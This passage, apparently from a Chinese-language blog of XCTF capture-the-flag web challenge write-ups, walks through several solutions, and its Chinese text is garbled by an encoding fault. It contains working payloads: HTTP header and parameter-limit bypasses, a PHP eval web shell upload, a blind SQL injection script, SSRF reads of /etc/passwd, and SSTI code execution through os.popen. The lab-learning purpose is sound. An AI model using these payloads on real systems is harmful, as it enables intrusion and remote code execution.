</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">admin</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;false&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">admin</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;true&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;try hard&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">({</span> <span class="nx">port</span><span class="o">:</span> <span class="nx">port</span> <span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁúãÂà∞expressÊ°ÜÊû∂ÔºåexpressÁöÑparameterLimitÈªòËÆ§‰∏∫1000ÔºåÂç≥ÂèÇÊï∞ÊúÄÂ§ßÈôêÂà∂‰∏∫1000</p>
<p>Ë¶ÅÊ±Çadmin‰º†ÂèÇ‰∏çÂåÖÂê´&rsquo;false&rsquo;Âπ∂‰∏îheadersËØ∑Ê±ÇÂ§¥ÈáåÁöÑadminÂ≠óÊÆµÂåÖÂê´&rsquo;true&rsquo;ÔºåÂéüÊù•ÁöÑphp‰ª£Á†ÅÈáåÈù¢ÊòØ‰ºöÂú®ÂèÇÊï∞ÁöÑÊúÄÂêéÊãºÊé•&amp;admin=falseÁöÑÔºåÂÜôËÑöÊú¨ËØ∑Ê±ÇÂä†‰∏ä1000‰∏™ÂèÇÊï∞Â∞±ËÉΩÊàêÂäüÊääÊãºÊé•ÁöÑ&amp;admin=flaseÊå§Êéâ</p>
<p>php‰ª£Á†Å‰∏≠Ë¶ÅÊ±ÇheadersÈáåÁöÑadminÂ≠óÊÆµÂåÖÂê´&rsquo;true&rsquo;Â∞±Ë°å‰∫ÜÔºåÂèØ‰ª•ÊòØ&rsquo;xtrue&rsquo;ÔºåËøôÈáåÊ†πÊçÆRFC 7230(HTTP/1.1ÂçèËÆÆÁöÑÂÆö‰πâ)ÁöÑËßÑÂÆöÔºåËßÑÂÆö‰∫Ü field-name ÊòØÁî±‰∏Ä‰∏™ÊàñÂ§ö‰∏™ÊâìÂç∞ÁöÑ ASCII Â≠óÁ¨¶ÁªÑÊàêÔºå‰∏çÂåÖÊã¨ÂàÜÈöîÁ¨¶ÔºåÂåÖÊã¨Á©∫Ê†º„ÄÇÂõ†Ê≠§ÔºåÂ¶ÇÊûú‰∏Ä‰∏™ field-name ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶ÊòØÁ©∫Ê†ºÔºåÈÇ£‰πàËøô‰∏™ HTTP header ÊòØÈùûÊ≥ïÁöÑÔºåÂ∫îËØ•Ë¢´ÊúçÂä°Âô®ÊàñÂÆ¢Êà∑Á´ØÂøΩÁï•ÊàñÊãíÁªùÔºåÁÑ∂ËÄåÔºåNode.js Âú®Â§ÑÁêÜËøôÁ±ªÊÉÖÂÜµÊó∂ÈÄöÂ∏∏ÊòØÂÆΩÂÆπÁöÑ„ÄÇ</p>
<p>‰º†ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;headers&#34;: [&#34;admin: x&#34;, &#34; true: y&#34;]}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúÄÂêéheaderË¢´nodejsËß£ÊûêÂêéÂèòÊàê</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  &#34;admin&#34;: &#34;x true y&#34;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âõ†‰∏∫trueÁöÑÂâçÈù¢Â§ö‰∫Ü‰∏™Á©∫Ê†ºÔºåÊâÄ‰ª•Êâç‰ºöË¢´Ëß£ÊûêÊàêËøôÊ†∑</p>
<p>ËøôÊ†∑adminÂ≠óÊÆµÂåÖÂê´‚Äòtrue‚ÄôÔºåÊª°Ë∂≥Êù°‰ª∂„ÄÇ</p>
<p>ÊàñËÄÖÊòØËøôÊ†∑</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;headers&#34;: [&#34;xx:xx\nadmin: true&#34;]}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âõ†‰∏∫ÂâçÈù¢ÁöÑstriposÂáΩÊï∞‰ºöÊü•ÊâæÁ¨¨‰∏Ä‰∏™ÂÜíÂè∑Âá∫Áé∞ÁöÑ‰ΩçÁΩÆÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞<code>admin</code>Âíå<code>true</code>Â≠óÁ¨¶‰∏≤ÈÉΩÂú®Á¨¨‰∏Ä‰∏™ÂÜíÂè∑ÂêéÈù¢ÔºåÂõ†Ê≠§ÂèØ‰ª•ÁªïËøáPHP‰ª£Á†ÅÁöÑÊ£ÄÊµãÔºåËÄåÂú®NodeJSËß£ÊûêÊó∂Ôºå‰ºöËß£ÊûêÂæóÂà∞<code>admin</code>ÁöÑÂ≠óÊÆµ‰∏∫true.</p>
<p>ËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;headers&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;xx:xx</span><span class="se">\n</span><span class="s2">admin: true&#34;</span><span class="p">],</span>        
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;params&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;admin&#34;</span><span class="p">:</span> <span class="s2">&#34;true&#34;</span><span class="p">}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1020</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">datas</span><span class="p">[</span><span class="s2">&#34;params&#34;</span><span class="p">][</span><span class="s2">&#34;x&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span> <span class="o">=</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">json1</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">datas</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">json1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>bpÁî®post‰º†jsonÂ∞±Ë°å‰∫Ü</p>
<h2 id="bug">bug
</h2><p>‰ª•‰∏∫ÊòØ‰∫åÊ¨°Ê≥®ÂÖ•ÔºåËØï‰∫ÜÂ•ΩÂá†ÈÅç‰∏çÂØπ</p>
<p>ÂÖàÊ≥®ÂÜå‰∏Ä‰∏™Ë¥¶Âè∑</p>
<p>Áé∞Âú®Êúâ‰∏§ÁßçÂÅöÊ≥ï</p>
<p>‰∏ÄÁßçÂà©Áî®ÈÄªËæëÊºèÊ¥ûÔºåÂõ†‰∏∫ÁôªÂÖ•ÊàêÂäü‰ºöÊòæÁ§∫uid</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112052001.png"
	width="504"
	height="174"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112052001_hu14076226741854884391.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112052001_hu5125310401321748394.png 1024w"
	loading="lazy"
	
		alt="image-20250127112052001"
	
	
		class="gallery-image" 
		data-flex-grow="289"
		data-flex-basis="695px"
	
></p>
<p><img src="C:%5cUsers%5c10086%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250127112112143.png"
	
	
	
	loading="lazy"
	
		alt="image-20250127112112143"
	
	
></p>
<p>ÊäìÂåÖ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112229033.png"
	width="1560"
	height="372"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112229033_hu687885397334976754.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112229033_hu7464072665026486943.png 1024w"
	loading="lazy"
	
		alt="image-20250127112229033"
	
	
		class="gallery-image" 
		data-flex-grow="419"
		data-flex-basis="1006px"
	
></p>
<p><img src="C:%5cUsers%5c10086%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250127112236847.png"
	
	
	
	loading="lazy"
	
		alt="image-20250127112236847"
	
	
></p>
<p>ÂèëÁé∞cookieÈáåÈù¢userÁöÑÂÄºÊòØuidÂÄºÔºöÁî®Êà∑ÂêçÁöÑMD5</p>
<p>Êàë‰ª¨Áõ¥Êé•Áî®1:adminÁöÑMD5ÊõøÊç¢</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112511633.png"
	width="905"
	height="212"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112511633_hu7607727269234429846.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112511633_hu10585356243796196570.png 1024w"
	loading="lazy"
	
		alt="image-20250127112511633"
	
	
		class="gallery-image" 
		data-flex-grow="426"
		data-flex-basis="1024px"
	
></p>
<p>ÊãøÂà∞ÂÖ∂‰ªñ‰ø°ÊÅØÊé•‰∏ãÊù•Â∞±ÊòØÊâæÂõû‰øÆÊîπadminÁöÑÂØÜÁ†ÅÁôªÂÖ•Â∞±Ë°å</p>
<p>Á¨¨‰∫åÁßçÂäûÊ≥ïÂà©Áî®ÊâæÂõûÂØÜÁ†ÅÁöÑÂåÖ‰øÆÊîπÊàêadminÁöÑÂØÜÁ†Å</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112706570.png"
	width="1485"
	height="497"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112706570_hu13222279945547112654.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112706570_hu4127436758810218909.png 1024w"
	loading="lazy"
	
		alt="image-20250127112706570"
	
	
		class="gallery-image" 
		data-flex-grow="298"
		data-flex-basis="717px"
	
></p>
<p>Êîπ‰∏∫adminÔºåÁôªÂÖ•ÊàêÂäü</p>
<p>Êü•Áúãmessage</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112848668.png"
	width="735"
	height="262"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127112848668_hu12424810900608279064.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127112848668_hu2242015858611813742.png 1024w"
	loading="lazy"
	
		alt="image-20250127112848668"
	
	
		class="gallery-image" 
		data-flex-grow="280"
		data-flex-basis="673px"
	
></p>
<p>Ë¶ÅÊîπXFFÂ§¥‰∫Ü</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127113719402.png"
	width="1495"
	height="801"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127113719402_hu13993707329297008914.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127113719402_hu2929809080062322024.png 1024w"
	loading="lazy"
	
		alt="image-20250127113719402"
	
	
		class="gallery-image" 
		data-flex-grow="186"
		data-flex-basis="447px"
	
></p>
<p>ÁúãÂà∞filemanageÊÉ≥Âà∞upload</p>
<p>ÊûúÁÑ∂ÊòØÊñá‰ª∂‰∏ä‰º†ÁïåÈù¢ÔºåÁõ¥Êé•‰∏ä‰º†phpÊòØ‰∏çË°åÁöÑÔºåÊèêÁ§∫just image</p>
<p>Êàë‰ª¨Ë¶ÅÊääcontent-typeÊîπÊàêimage/jpeg</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250127115017317.png"
	width="529"
	height="166"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250127115017317_hu3801462783309944925.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250127115017317_hu12176012849245926618.png 1024w"
	loading="lazy"
	
		alt="image-20250127115017317"
	
	
		class="gallery-image" 
		data-flex-grow="318"
		data-flex-basis="764px"
	
></p>
<p>ÊµãËØïÂèëÁé∞Âè™Êúâphp4Âíåphp5ËÉΩË¢´Ëß£ÊûêÊàêphp</p>
<?php‰ºöË¢´Ê£ÄÊµã

ÁÑ∂Âêé<?‰∏çË°å

ÊÉ≥Âà∞Áî®`<script language='php'>1</script>`Êù•Ë°®Á§∫php

```
<script language='php'>eval($_POST['cmd'])</script>
```

![image-20250127115812952](image-20250127115812952.png)

‰∏ä‰º†ÊàêÂäü

![image-20250127115836007](image-20250127115836007.png)

## ics-07

‰ª£Á†ÅÂÆ°ËÆ°ÈùûÂ∏∏ÁÆÄÂçï

Ë¶ÅÊ±Çpost‰º†conÂÄºÂíåfileÂÄº,ÊúÄÂêéÊää‰∏ä‰º†Êñá‰ª∂‰øùÂ≠òÂà∞/backup‰∏ãÔºåÂèà‰ºöÂàõÂª∫‰∏Ä‰∏™uploadÊñá‰ª∂Â§πÔºåÊâÄ‰ª•ÊúÄÂêéÊñá‰ª∂Âú®upload/backup‰∏ãÔºåÁÑ∂ÂêéfileËøáÊª§‰∫ÜphpÁöÑÂÖ∂‰ªñÁ≠â‰ª∑ÊãìÂ±ïÂêç

ËøôÈáåÂà©Áî®Âà∞apache2.xÁöÑËß£ÊûêÊºèÊ¥û

‰º†ÂÖ•shell.php/1.php/..Áî±‰∫é/..ÊòØËøîÂõûÁà∂ÁõÆÂΩïÁöÑÊÑèÊÄùÔºåËøôÊ†∑Â∞±‰ºöËß£ÊûêÊàêshell.php

con‰º†‰∏ÄÂè•ËØù

ÁÑ∂ÂêéÂêéÈù¢ÈÇ£‰∏™floatvalÂáΩÊï∞Âº∫ÊØîËæÉÁî®1abc9ÁªïËøáËøôÊ†∑ÊòØÂ≠óÁ¨¶‰∏≤‰∏îÊúÄÂêé‰∏Ä‰ΩçÊòØ9

‰∏ä‰º†ÂêéËöÅÂâëËøûÊé•

## unfinish

ÁõÆÂΩïÊâ´Êèè

![image-20250130112350064](image-20250130112350064.png)

ÂèëÁé∞register.php

Ê≥®ÂÜåÂêéÁôªÂÖ•ÂèëÁé∞index.phpÂõûÊòæÁî®Êà∑Âêç

Áî±‰∫éÈ¢òÁõÆÊèêÁ§∫sqlÔºåÊâÄ‰ª•ÊÉ≥Âà∞‰∫åÊ¨°Ê≥®ÂÖ•ÔºåÂú®Ê≥®ÂÜåÁïåÈù¢ÁöÑÁî®Êà∑ÂêçÂ§ÑÂ≠òÂú®Ê≥®ÂÖ•ÁÇπ

bpÊäìÊ≥®ÂÜåÁïåÈù¢ÂåÖ

fuzzÊµãËØï

![image-20250130113316020](image-20250130113316020.png)



information‰πüË¢´ËøáÊª§‰∫Ü

‰∏ãÈù¢Â∞±ÊòØÊûÑÈÄ†‰∫åÊ¨°Ê≥®ÂÖ•ËØ≠Âè•

Áî±‰∫ésql‰∏≠+ÊòØËøêÁÆóÁ¨¶

Â≠òÂú®‰∫åÊ¨°Ê≥®ÂÖ•`0'+1+'0`‰ºöÂõûÊòæ1

Êàë‰ª¨Âú®‰∏§‰∏™ÂºïÂè∑Áõ¥Êé•ÊèíÂÖ•Êü•ËØ¢ËØ≠Âè•

```
0'+ascii(substr(database() from 1 for 1)+'0
0'+ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))+'0
ËøôÈáåÁöÑflagË°®ÂêçÊòØÁåúÁöÑÔºåÂõ†‰∏∫informationË¢´ËøáÊª§‰∫Ü
0‚Äô+ascii(substr((select * from flag),1,1))+‚Äò0
Áî±‰∫éÔºå‰πüË¢´ËøáÊª§ÔºåÊâÄ‰ª•Áî®from*for*ËØ≠Âè•‰ª£Êõø
0‚Äô+ascii(substr((select * from flag) from 1 for 1))+'0
Êé•‰∏ãÊù•Â∞±ÊòØÁî®ËÑöÊú¨ËøõË°åÂ∏ÉÂ∞îÁõ≤Ê≥®Êù•ÁàÜÁ†¥Ë°®ÈáåÁöÑÊï∞ÊçÆ
```

```python
import requests, re


# ÊãøÂà∞ÁôªÂΩïÈ°µÈù¢ÁöÑurlÂíåÊ≥®ÂÜåÈ°µÈù¢ÁöÑurl
login_url = 'http://61.147.171.105:51643/login.php'
register_url = 'http://61.147.171.105:51643/register.php'
flag = ''

# ÊØèÊ¨°Ê≥®ÂÜå‰∏Ä‰∏™Ë¥¶Êà∑ÔºåÊãøÂà∞Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑ‰∏Ä‰∏™Â≠óÁ¨¶
for i in range(1, 100):
    # Ê≥®ÂÜåÊó∂ÂÄôÁöÑpayloadÊï∞ÊçÆ
    register_data = {
        'email': 'test%d123.com' % i,
        'username': "0' + ascii(substr((select * from flag) from %d for 1)) + '0" % i,
        'password': '123'
    }
    # postÊèê‰∫§Ê≥®ÂÜåpayload
    res = requests.post(url=register_url,data=register_data)
    
    # ÁôªÂΩïÊó∂ÂÄôÁöÑpayloadÊï∞ÊçÆ
    login_data = {
        'email': 'test%d123.com' % i,
        'password': '123'
    }
    # postÊèê‰∫§ÁôªÂΩïpayload
    res = requests.post(url=login_url, data=login_data)

    # ‰ΩøÁî®Ê≠£ÂàôÂåπÈÖçÔºåÊâæÂà∞ÂâçÁ´ØÁöÑÂõûÊòæÊï∞ÊçÆ
    num = re.search('<span class="user-name">\n(.*?)</span>', res.text)
    # Â∞ÜÊãøÂà∞ÁöÑasciiËΩ¨Á†ÅÔºåËøòÂéüÊàêÂ≠òÂÇ®ÁöÑÊï∞ÊçÆ
    flag += chr(int(num.group(1).strip()))
    print(flag)
```

```
% i  #Ë°®Á§∫ÊØèÊ¨°Ê≥®ÂÜåÁöÑÊó∂ÂÄôÔºå‰ΩøÁî®%iÂéªÊõøÊç¢%dÁöÑÊï∞ÊçÆ
.*?ÊòØÈùûË¥™Â©™Ê≠£ÂàôÂåπÈÖçÔºåÁà¨Ëô´ÁöÑÊó∂ÂÄôÁî®ÁöÑ
```

![image-20250130114619928](image-20250130114619928.png)

## È¢òÁõÆÂêçÁß∞-SSRF Me

ssrfÊòØÊúçÂä°Á´Ø‰º™ÈÄ†ÊîªÂáª

ÊâÄ‰ª•‰∏äÊù•ÁöÑurlÂú∞ÂùÄÊàë‰ª¨ÂèØ‰ª•Áî®file‰º™ÂçèËÆÆËØªÂèñ‰ªñÊú¨Âú∞ÁöÑÊñá‰ª∂

ËÄå‰∏ãÈù¢ÈÇ£‰∏™È™åËØÅÁ†ÅÔºåÊàë‰ª¨Áî®ËÑöÊú¨ÁàÜÁ†¥

```php
<?php
$captcha=0;
while(true)
{
    if(substr(md5($captcha), -6, 6) == "ecf20f")
    {
        echo $captcha;
        break;
    }
    $captcha++;

}
?>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">‰∏äÈù¢ÂÖàËØïÁùÄËÆøÈóÆ`file:///etc/passwd`
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ÂõûÊòæ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Êàë‰ª¨Â∞ùËØïÁõ¥Êé•ËØªÂèñflag`flie:///flag`ÂõûÊòæhack
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ËØ¥ÊòéÊúâËøáÊª§ÔºåÊàë‰ª¨Áõ¥Êé•Áî®urlÁºñÁ†ÅÁöÑflagËÆøÈóÆ`file:///%66%6c%61%67`
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Âá∫Áé∞flag
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">![image-20250130130436846](image-20250130130436846.png)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">## easy_web
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Â∞ùËØïsqlÊ≥®ÂÖ•ÂèëÁé∞‰∏çË°å
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bpÊäìÂåÖÁúãÊ°ÜÊû∂ÊòØpythonÔºåÊÉ≥Âà∞SSTI
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">‰ΩÜÊòØÊâãÂä®ÊµãËØï‰∫Ü‰∏Ä‰∫õÂ≠óÁ¨¶Ë¢´ËøáÊª§ÔºåËÄåËøôÈáåÊòØÂ≠óÁ¨¶ËßÑËåÉÂô®ÔºåÈÄöËøáÁâπÊÆäÂ≠óÁ¨¶Êù•ÁªïËøá
</span></span></code></pre></td></tr></table>
</div>
</div><p>{ -&gt; Ô∏∑/Ôπõ
} -&gt; Ô∏∏/Ôπú
&rsquo; -&gt; Ôºá
, -&gt; Ôºå
&quot; -&gt; ÔºÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">Áî®‰∏áËÉΩ</span><span class="n">payloadÊõøÊç¢</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">```</span><span class="n">python</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">a</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;</span><span class="p">)}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊõøÊç¢ËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">{ -&gt; Ô∏∑/Ôπõ
</span></span></span><span class="line"><span class="cl"><span class="s2">} -&gt; Ô∏∏/Ôπú
</span></span></span><span class="line"><span class="cl"><span class="s2">&#39; -&gt; Ôºá
</span></span></span><span class="line"><span class="cl"><span class="s2">, -&gt; Ôºå
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34; -&gt; ÔºÇ
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="n">Ê≠§Êó∂ÁöÑstrÂç≥‰Ω†Ë¶ÅËæìÂÖ•ÁöÑpayload</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;{{a.__init__.__globals__.__builtins__.eval(&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;)}}&#39;&#39;&#39;</span> <span class="c1"># ÂéüÂ≠óÁ¨¶‰∏≤</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Â¶ÇÊûúÈúÄË¶ÅÊõøÊç¢replace(Ë¢´ÊõøÊç¢ÁöÑÂ≠óÁ¨¶,ÊõøÊç¢ÂêéÁöÑÂ≠óÁ¨¶)</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;{&#39;</span><span class="p">,</span> <span class="s1">&#39;Ô∏∑&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;Ô∏∏&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;Ôºá&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\&#34;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;ÔºÇ&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250130215647111.png"
	width="984"
	height="308"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250130215647111_hu12398852240813051090.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250130215647111_hu16441723671702758866.png 1024w"
	loading="lazy"
	
		alt="image-20250130215647111"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="766px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250130215703701.png"
	width="895"
	height="330"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250130215703701_hu11888995718076819814.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250130215703701_hu14996531949812892576.png 1024w"
	loading="lazy"
	
		alt="image-20250130215703701"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="650px"
	
></p>
<p>ÊàñËÄÖËÄÅÂ•óË∑ØÂÖàÊü•Â≠êÁ±ªÁöÑÁà∂Á±ªÔºåÊâæÊúâÁî®ÁöÑfunction</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250130221402975.png"
	width="811"
	height="261"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250130221402975_hu3672360069884041939.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250130221402975_hu11965084219701418160.png 1024w"
	loading="lazy"
	
		alt="image-20250130221402975"
	
	
		class="gallery-image" 
		data-flex-grow="310"
		data-flex-basis="745px"
	
></p>
<p>warningsÂú®191</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
